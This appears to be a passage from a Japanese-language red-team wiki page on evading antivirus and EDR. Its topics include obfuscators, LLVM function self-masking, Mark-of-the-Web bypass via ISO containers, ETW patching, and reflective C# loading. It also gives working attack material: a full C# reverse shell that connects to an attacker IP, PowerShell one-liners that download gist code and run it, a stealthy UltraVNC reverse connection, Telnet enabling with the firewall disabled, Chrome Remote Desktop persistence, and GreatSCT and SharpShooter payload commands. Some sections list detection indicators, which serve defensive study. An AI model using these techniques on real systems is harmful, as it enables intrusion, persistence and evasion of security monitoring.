   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Flags:
     • `-p crx` – ConfuserEx 2 プロファイルを選択
     • de4dot は control-flow flattening を解除し、元の namespace、class、変数名を復元して、定数文字列を復号します。

3.  Proxy-call stripping – ConfuserEx は、逆コンパイルをさらに困難にするため、直接のメソッド呼び出しを軽量なラッパー（別名 *proxy calls*）に置き換えます。**ProxyCall-Remover** で削除します。
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   この手順の後、`Class8.smethod_10` などの不透明なラッパー関数ではなく、`Convert.FromBase64String` や `AES.Create()` のような通常の .NET API が確認できるはずです。

4.  手動クリーンアップ – 生成されたバイナリを dnSpy で実行し、大きな Base64 blob や `RijndaelManaged`/`TripleDESCryptoServiceProvider` の使用箇所を検索して、*実際の* payload を特定します。多くの場合、マルウェアは `<Module>.byte_0` 内で初期化される TLV encoded byte array として payload を保存しています。

この一連の手順では、悪意のあるサンプルを実行せずに実行フローを復元できます。オフラインのワークステーションで作業するときに便利です。

> 🛈  ConfuserEx は `ConfusedByAttribute` というカスタム属性を生成します。これは IOC として使い、サンプルを自動的にトリアージできます。

#### ワンライナー
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): このプロジェクトの目的は、[code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>)と改ざん防止によってソフトウェアのセキュリティを高めることができる、[LLVM](http://www.llvm.org/)コンパイルスイートのオープンソースforkを提供することです。
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscatorは、外部ツールを使わず、コンパイラも変更せずに、`C++11/14`言語を使ってコンパイル時にobfuscated codeを生成する方法を示します。
- [**obfy**](https://github.com/fritzone/obfy): C++ template metaprogramming frameworkによって生成されるobfuscated operationsの層を追加し、アプリケーションの解析を試みる人の作業を少し難しくします。
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatrazは、.exe、.dll、.sysなど、さまざまなpe filesをobfuscateできるx64 binary obfuscatorです。
- [**metame**](https://github.com/a0rtega/metame): Metameは、任意の実行ファイルを対象とするシンプルなmetamorphic code engineです。
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscatorは、ROP (return-oriented programming)を用いて、LLVMがサポートする言語を対象に細粒度のcode obfuscationを行うフレームワークです。通常の命令をROP chainsに変換し、プログラムをassembly codeレベルでobfuscateすることで、通常の制御フローに対する自然な認識を妨げます。
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcryptは、Nimで書かれた.NET PE Crypterです。
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptorは、既存のEXE/DLLをshellcodeに変換してからロードできます。

### LLVM compiler-assisted per-function self-masking

implant全体をスリープ中だけマスキングする代わりに、変更を加えたLLVM X86 backendを使うと、選択した関数が非アクティブな間、常にXORでマスキングできます。Function Peekaboo PoCは、demangled nameに`REG_`を含む関数を選択し、最終的なmachine codeの前後にposition-independentなentry/exit stubsを挿入し、共有のmasking handlerを`.text`内に1つ生成します。ソースレベルのsignatureとWindows x64 calling conventionは変更されません。<sup>[[38]](#references)[[39]](#references)</sup>

#### Backend control-flow transformation

この処理は、命令選択と最適化の後に行います。変換では**すべての出力されたreturn**を対象にし、正確なx86レイアウトを把握する必要があるためです。出力前の`MachineFunctionPass`で最後の`MachineInstr::isReturn()`を見つけて削除し、最終経路が追加されたepilogueへフォールスルーするようにします。それ以前のreturnは`JMP_1 handler`に置き換えます。各returnの前にある、コンパイラが生成したstack/frameの後処理は残し、return命令だけをリダイレクトします。<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()`と`emitFunctionBodyEnd()`は関数ごとのstubsを出力し、`emitEndOfAsmFile()`はhandlerを出力します。出力段階間で共有されるsymbolsを使うことで、prologueのbranchから後で出力されるepilogueへ飛べます。手動でnear `je`を出力する場合は、`0F 84`に続けて、4バイトのMC expression `target - address_after_je`を書き込みます。handlerへのcallsとjumpsは、代わりに`MCInst` objects（`CALL64pcrel32`と`JMP_1`）として出力できます。選択されなかった関数に変更を加えていない場合、passは`false`を返す必要がありますが、PoCはその経路で誤って`true`を返します。<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadata and pre-CRT initialization

PoCは、XOR keyと、loaderによってrelocateされた関数ポインタおよび実行時の長さを含む16バイトのrecordsを`.funcmeta`に配置します。Cのfieldは`uint32_t`ですが、handlerはrecordのoffset `+8`にあるQWORDにアクセスするため、長さとpaddingを読み込み、recordsを`0x10`ずつ進めます。PE section名は8バイトしかないため、実行時の検索では`.funcmet`として認識されます。外部patcherが実行可能な`.stub`を追加し、stub内に元のentry-point RVAを保存してから`AddressOfEntryPoint`を変更します。PIC stubは`gs:[0x60]` → `[PEB+0x10]`からimage baseを取得し、PE32+ importsをたどって、すでにimportされている`VirtualProtect`を解決し、CRTより前に実行されます。<sup>[[38]](#references)[[39]](#references)</sup>

初期化では`gs:[0xE8]`にsentinelを設定し、metadataにあるすべての関数を呼び出します。常に読み取り可能なprologueは、関数の開始位置を`gs:[0xF0]`に記録し、sentinelを検出すると、まだclearなbodyをスキップします。その後epilogueが`call handler`を実行します。handlerが13個のregisters（`0x68` bytes）を保存した後、`[rsp+0x68]`にあるreturn addressが変換後の関数の終端になるため、`end - start`をそのmetadata recordに書き込めます。すべてのbodyがマスキングされた後、stubはsentinelをクリアし、`ImageBase + original_entry_point_RVA`へjumpします。<sup>[[38]](#references)[[39]](#references)</sup>

通常のcallでは、prologueが同じ対称handlerを呼び出してbodyを復号します。最終経路は追加されたepilogueへフォールスルーし、それ以前のreturnはすべて共有handlerへ直接jumpします。通常のepilogueも`call`ではなく`jmp handler`を使うため、再マスキング後にhandlerの`ret`が呼び出し元のreturn addressを消費し、関数の戻り値を`RAX`に保持します。<sup>[[38]](#references)[[39]](#references)</sup>

#### Masking primitive and analysis indicators

handlerは現在のrecordを見つけ、固定長の可視prologue（このbuildでは`0x46` bytes）をスキップし、残りを`PAGE_EXECUTE_READWRITE`に変更します。続いて、各byteをkeyの下位byteでXORし、最後に`PAGE_EXECUTE_READ`に設定します。同じloopが、entry時には復号し、通常のexit時には暗号化します。<sup>[[38]](#references)[[39]](#references)</sup>

この設計を示す可能性が高いindicatorは次のとおりです。<sup>[[38]](#references)[[39]](#references)</sup>

- 実行可能な`.stub`内にあるentry pointと、keyおよびrelocateされた`.text` pointersを格納する`.funcmet` section
- pre-CRTでのPEB、import table、section tableの解析と、その後に続く各metadata pointer経由の呼び出し
- 同一の`call`/`pop` PIC prologuesと、1つのhandlerへリダイレクトされた多数のreturn sites
- `gs:[0xE8]`、`gs:[0xF0]`、`gs:[0xF8]`への書き込みに続く、繰り返しの`VirtualProtect`による保護属性の変更と、image-backedの実行可能ページへのbyte単位のXOR書き込み

これはmemory-scanner evasionであり、暗号学的な保護ではありません。patch済みのファイルには、元のclear bodyが残っています。また、debuggerで`VirtualProtect`やXOR loopにbreakを設定すれば、実行中の関数をdumpできます。1 byteのXOR、読み取り可能なmetadata、固定の`0x46`境界により、オフラインでの復元も容易です。<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> PoCのTEB slotsはthread-localですが、変更されたcode pagesはprocess-wideです。そのため、複数スレッドからの同時実行や再帰呼び出しによって、別の呼び出しが実行中に命令が再度切り替わる可能性があります。例外やnonlocal exitによって、再マスキングが回避される場合もあります。堅牢な実装では、状態の切り替えを同期し、`lpflOldProtect`を通じて返された実際の保護属性を復元し、stubの長さをハードコードせず、x64 stack alignmentについて`call`と`jmp`の両方の経路を検証し、実行可能なbyteを書き換えた後に`FlushInstructionCache`を呼び出す必要があります。Microsoftは、実行可能コードを変更する場合、instruction-cache coherencyの確保は呼び出し側の責任であると明示しています。<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen & MoTW

インターネットから実行ファイルをダウンロードして実行するときに、この画面を見たことがあるかもしれません。

Microsoft Defender SmartScreenは、潜在的に悪意のあるアプリケーションの実行からエンドユーザーを保護するためのセキュリティ機構です。

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreenは主にreputation-based approachを採用しています。つまり、ダウンロード数の少ないアプリケーションはSmartScreenの警告を引き起こし、エンドユーザーによるファイルの実行を防ぎます（ただし、More Info -> Run anywayをクリックすれば実行できます）。

**MoTW** (Mark of The Web)は、Zone.Identifierという名前の[NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>)です。インターネットからファイルをダウンロードすると自動的に作成され、ダウンロード元のURLも記録されます。

<figure><img src="../images/image (237).png" alt=""><figcaption><p>インターネットからダウンロードしたファイルのZone.Identifier ADSを確認する。</p></figcaption></figure>

> [!TIP]
> **trusted** signing certificateで署名された実行ファイルでは、**SmartScreenは起動しない**ことに注意してください。

payloadにMark of The Webが付与されるのを防ぐ非常に効果的な方法は、ISOなどのコンテナに格納することです。これは、Mark-of-the-Web (MOTW)を**non NTFS**ボリュームに適用**できない**ためです。

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/)は、Mark-of-the-Webを回避するため、payloadを出力コンテナにパッケージ化するツールです。

使用例:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

以下は、[PackMyPayload](https://github.com/mgeeky/PackMyPayload/)を使ってpayloadをISOファイルにパッケージ化し、SmartScreenをbypassするデモです。

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows（ETW）は、アプリケーションやシステムコンポーネントが**イベントを記録**できる、Windowsの強力なログ記録機構です。ただし、セキュリティ製品が悪意のあるアクティビティを監視・検出するために使うこともできます。

AMSIを無効化（bypass）するのと同様に、ユーザースペースプロセスの**`EtwEventWrite`**関数を、イベントを記録せず即座にreturnするようにすることも可能です。これは、メモリ内で関数にパッチを適用して即座にreturnさせることで、そのプロセスのETWログ記録を実質的に無効化します。

詳しくは、**[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) と [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**をご覧ください。<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

C#バイナリをメモリ内にロードする手法は以前から知られており、AVに検知されずにpost-exploitationツールを実行する非常に有効な方法です。

payloadはディスクに触れることなくメモリに直接ロードされるため、プロセス全体でAMSIにパッチを適用するだけで済みます。

ほとんどのC2フレームワーク（sliver、Covenant、metasploit、CobaltStrike、Havocなど）は、C# assembliesをメモリ内で直接実行する機能をすでに備えていますが、実行方法はいくつかあります。

- **Fork\&Run**

**新しい使い捨てプロセスを起動**し、そのプロセスにpost-exploitationの悪意あるコードをinjectして実行し、完了後に新しいプロセスを終了させます。この方法には利点と欠点があります。Fork and Run方式の利点は、実行がBeacon implantプロセスの**外部**で行われることです。つまり、post-exploitationの処理で問題が起きたり検知されたりしても、**implantが生き残る可能性が大幅に高くなります。** 欠点は、**Behavioral Detections**に検知される**可能性が高くなる**ことです。

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

post-exploitationの悪意あるコードを**自身のプロセスに**injectします。これにより、新しいプロセスを作成してAVにスキャンされるのを避けられます。一方で、payloadの実行時に問題が起きると、クラッシュして**beaconを失う可能性が大幅に高くなる**という欠点があります。

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> C# Assemblyのロードについて詳しく知りたい場合は、この記事[https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/)と、InlineExecute-Assembly BOF（[https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly)）をご覧ください。

PowerShellからC# Assembliesをロードすることもできます。[Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader)と[S3cur3th1sSh1tの動画](https://www.youtube.com/watch?v=oe11Q-3Akuk)をご覧ください。

## .NETツールのNativeAOT WebAssembly再パッケージ化（WasmForge）

通常の`execute-assembly`手法では、認識可能なMSILが残り、最終的にCLRが初期化されます。**WasmForge**は実行基盤そのものを変更します。C#プロジェクトを実験的なNativeAOT-LLVM WASIターゲットに移行し、事前にWebAssemblyへコンパイルしたうえで、そのモジュールをWazeroベースのWindows PEホストに埋め込みます。生成されたプロセスは対象のCLR、JIT、`dotnet`ホストを必要としないため、マネージドアセンブリ名、CLRのロード、AMSI、または.NET ETWだけに基づくルールでは、直接的な可視性が失われます。これは回避・パッケージ化手法であり、権限境界をbypassするものではありません。ゲストは元のツールと同じ権限を持ち、OS上での挙動も観測可能です。<sup>[[44]](#references)[[45]](#references)</sup>

### C#プロジェクトのビルド

推奨されるビルド方法は、.NET 10 SDK、NativeAOT-LLVM workload、WASI SDK 24.0、linker、署名に必要な依存関係が含まれている、プロジェクトのDocker環境を使うことです。`.csproj`は自動検出され、ワンショットのビルドで移行、互換性パッチの適用、WASMコンパイル、PEの生成、署名が実行されます。<sup>[[45]](#references)</sup>

```bash
# From the WasmForge repository
make docker-build
make docker-run DOCKER_SRC=/path/to/Seatbelt DOCKER_PROJECT=seatbelt

# Equivalent direct build when all prerequisites are installed
GOOS=windows GOARCH=amd64 ./wasmforge build --win32-apis \
  -o seatbelt.exe /path/to/Seatbelt/Seatbelt/
```

トラブルシューティングや生成コードの確認では、プロセスを `wasmforge dotnet-migrate <dir>`、`wasmforge dotnet-patch <dir>`、`dotnet publish -c Release -r wasi-wasm`、最後に `wasmforge build --wasm <module> --nativeaot --win32-apis -o <output.exe>` に分けます。ビルドイメージでは `wasm-component-ld` ラッパーも使用し、WASI Preview 2 のコンポーネントエンコーディングを回避して、埋め込みランタイムが想定するプレーンなモジュールを生成します。<sup>[[44]](#references)[[45]](#references)</sup>

### wasm32 C# と x64 Win32 のブリッジ

これは透過的な再コンパイルではありません。NativeAOT-WASI では Windows 向けの BCL 機能が欠けていたり、動作が変更されていたりします。また、wasm32 ゲストは通常4バイトのポインタースロットを割り当てますが、x64 API は8バイトのポインターを返すことがあります。WasmForge は、次の生成レイヤーで両方の問題に対応します。<sup>[[44]](#references)</sup>

1. ソースパッチャーが AOT 固有のセマンティックな差異を修正し、未対応のレジストリ、パイプ、WMI、ID、ディレクトリーサービス、ファイルバージョン、LSA などの呼び出しを `Wf*` ヘルパーにリダイレクトします。
2. P/Invoke スキャナーが NativeAOT の `DirectPInvoke` マッピングを生成し、`[DllImport]` 呼び出しがゲスト内で宣言された DLL を動的にロードするのではなく、リンクされた C ブリッジシンボルにバインドされるようにします。
3. ホストに渡すポインターには C# で `ulong`、C で `uint64_t` を使用します。汎用ディスパッチャーが呼び出しをホストの Win32 ハンドラーに転送します。`out8_mask` は、上位半分を保持する必要がある実際の8バイト出力スロットを示します。マークされていない wasm32 形式の出力には snapshot/restore 保護を適用し、x64 からの書き込みが隣接する4バイトを破損しないようにします。
4. 汎用 syscall ディスパッチに適さない操作には、専用のホストブリッジを使用します。たとえば、LSA チケットキャッシュへのアクセス、構造化された結果を伴う Kerberos/BCrypt 操作、TCP 経由の KDC 通信、LDAP クエリなどです。

たとえば、`version.dll!VerQueryValueW` 用のラッパーは4つのホストアドレスを渡し、値ポインターと長さが8バイトの出力スロットであるため、ビット2と3（`0xC`）を設定します。ラッパー自体は汎用のままで、DLL 名、エクスポート名、引数、マスクを `wf_call_v2` に渡します。ホストがポインターを変換し、ネイティブ API を呼び出します。<sup>[[44]](#references)</sup>

```c
uint32_t version_VerQueryValueW_v2(uint64_t block, uint64_t subblock,
    uint64_t value_out, uint64_t length_out) {
    return (uint32_t)wf_call_v2("version.dll", "VerQueryValueW", 4,
        0xC, block, subblock, value_out, length_out);
}
```

### 制限事項と検知の手がかり

Reflection を多用するコード、動的な assembly の読み込み、任意の native callback、WASM memory に返される複雑な x64 構造体は、ツールごとのパッチが必要になる場合や、まったく動作しない場合があります。汎用の WASI Preview 2 socket も no-op stub に到達することがあるため、対応ツールでは protocol 固有の host shim を使用します。機能が同等だと決めつけず、各コマンドを native build と照合して検証してください。<sup>[[44]](#references)[[45]](#references)</sup>

この手法は telemetry の場所を移すものであり、payload を不可視にするものではありません。検知の手がかりとして、WASM module を含む、または実体化する PE、Wazero に似た runtime の挙動、通常と異なる host/guest memory の割り当てとコピー、汎用の直接的な Win32 dispatch、署名や PE resource の異常、さらにその結果生じる API 呼び出しや network traffic が考えられます。そのため、CLR-load、AMSI、.NET ETW event がないことを、プロセスが無害である証拠として扱うべきではありません。<sup>[[44]](#references)</sup>

## 他のプログラミング言語を使用する

[**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) で提案されているように、侵害したマシンから **Attacker Controlled SMB share にインストールされた interpreter 環境へアクセスできるようにする**ことで、他の言語を使って悪意のあるコードを実行できます。

SMB share 上の Interpreter Binaries と環境へのアクセスを許可すれば、侵害したマシンの **memory 内で、これらの言語による任意のコードを実行できます**。

repo によると、Defender は引き続き script をスキャンしますが、Go、Java、PHP などを利用することで **static signature を回避する柔軟性が高まります**。これらの言語で難読化していない reverse shell script をランダムに使ってテストしたところ、成功しています。

## 静的解析の回避を目的とした WebAssembly の再ホスト

<a id="bridging-linear-memory-to-native-apis"></a>
<a id="per-build-wasm-vm-polymorphism"></a>
<a id="camouflaging-the-outer-go-executable"></a>

{{#ref}}
virtualized-payload-execution.md#webassembly-re-hosting-for-static-analysis-evasion
{{#endref}}

## TokenStomping

Token stomping は、EDR や AV などのセキュリティ製品の access token を操作します。token の権限を下げると、プロセスを動作させたまま、特権を必要とする検査や修復の実行を妨げられる場合があります。

これを防ぐため、Windows は **外部プロセス**がセキュリティプロセスの token に対する handle を取得できないようにすることが考えられます。

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## 信頼されたソフトウェアを使用する

### Chrome Remote Desktop

[**このブログ記事**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)で説明されているように、被害者の PC に Chrome Remote Desktop をインストールし、それを使って乗っ取りと永続化を行うのは簡単です。<sup>[[35]](#references)</sup>
1. https://remotedesktop.google.com/ からダウンロードし、"Set up via SSH" をクリックしてから、Windows 用の MSI ファイルをクリックしてダウンロードします。
2. 被害者の環境で installer をサイレント実行します（admin 権限が必要です）。`msiexec /i chromeremotedesktophost.msi /qn`
3. Chrome Remote Desktop のページに戻り、next をクリックします。wizard で認証を求められたら、Authorize ボタンをクリックして続行します。
4. 必要な箇所を変更して、提示されたコマンドを実行します。`"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111`（`--pin` parameter を使うと、GUI を使わずに PIN を設定できます。）


## 高度な回避

{{#ref}}
virtualized-payload-execution.md
{{#endref}}

回避は非常に複雑なテーマです。1つのシステムだけでも多くの異なる telemetry の情報源を考慮する必要がある場合があり、成熟した環境で完全に検知を逃れるのは、ほぼ不可能です。

対処する環境ごとに、それぞれ強みと弱みがあります。

より高度な回避手法を知るために、[@ATTL4S](https://twitter.com/DaniLJ94) のこの講演をぜひご覧ください。


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

これは、[@mariuszbit](https://twitter.com/mariuszbit) による Defense in Depth の回避についての、もう一つの素晴らしい講演です。


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **古い手法**

### **Defender が悪意のあるものと判定する箇所を特定する**

[**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) を使うと、**binary の一部を削除しながら**、Defender が悪意のあるものと判定する箇所を**特定して切り分けられます**。\
同じことを行う別の tool は [**avred**](https://github.com/dobin/avred) で、[**https://avred.r00ted.ch/**](https://avred.r00ted.ch/) でサービスを公開しています。

### **Telnet Server**

Windows10 までの Windows には、次のようにして（administrator として）インストールできる **Telnet server** が付属していました。

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

システム起動時に**開始**し、今すぐ**実行**します:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**telnetポートを変更（ステルス）し、ファイアウォールを無効化する：**

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

こちらからダウンロードします: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html)（setupではなく、bin downloadsを使用します）

**ホスト上**: _**winvnc.exe**_ を実行し、サーバーを設定します:

- _Disable TrayIcon_ オプションを有効にする
- _VNC Password_ にパスワードを設定する
- _View-Only Password_ にパスワードを設定する

次に、バイナリ _**winvnc.exe**_ と、新しく作成されたファイル _**UltraVNC.ini**_ を **victim** に移動します

#### **Reverse connection**

**attacker** は、自分の **host** 上でバイナリ `vncviewer.exe -listen 5900` を **実行**して、reverse **VNC connection** を受け取れる状態にします。次に、**victim** 上で winvnc daemon を起動します `winvnc.exe -run`。続けて `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` を実行します

**警告:** ステルス性を維持するため、次の操作は行わないでください

- すでに実行中の場合は `winvnc` を起動しないでください。起動すると [popup](https://i.imgur.com/1SROTTl.png) が表示されます。`tasklist | findstr winvnc` で実行中か確認します
- 同じディレクトリに `UltraVNC.ini` がない状態で `winvnc` を起動しないでください。起動すると [config window](https://i.imgur.com/rfMQWcf.png) が開きます
- ヘルプを表示するために `winvnc -h` を実行しないでください。[popup](https://i.imgur.com/oc18wcu.png) が表示されます

### GreatSCT

こちらからダウンロードします: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

GreatSCT 内部:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

次に、`msfconsole -r file.rc` で **listenerを起動し**、次のコマンドで **xml payloadを実行します**:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**現在のDefenderはプロセスを非常に速く終了させます。**

### 独自のreverse shellをコンパイルする

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### 最初のC# Revershell

次のコマンドでコンパイルします：

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

次のように使用します:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# compilerの使用

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

自動ダウンロードと実行：

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# obfuscators の一覧: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Injector の構築例に Python を使用:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### その他のツール

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
